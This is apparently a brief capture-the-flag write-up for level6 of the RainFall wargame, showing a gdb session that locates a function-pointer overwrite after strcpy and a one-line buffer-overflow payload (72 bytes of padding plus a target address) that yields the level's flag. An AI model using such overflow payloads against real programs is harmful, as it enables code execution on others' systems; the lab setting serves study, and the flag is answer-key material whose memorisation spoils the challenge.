- `level6@RainFall:~$ gdb ./level6`
<pre>
(gdb) disass main
Dump of assembler code for function main:
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
<strong>   0x080484d0 <+84>:    call   *%eax</strong>
   0x080484d2 <+86>:    leave 
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) b *0x080484d0
Breakpoint 1 at 0x80484d0
(gdb) r $(python -c "print('A' * 72 + 'BBBB')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level6/level6 $(python -c "print('A' * 72 + 'BBBB')")

Breakpoint 1, 0x080484d0 in main ()
<strong>(gdb) x/s $eax
0x42424242:      <Address 0x42424242 out of bounds></strong>
</pre>

- `./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")`
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
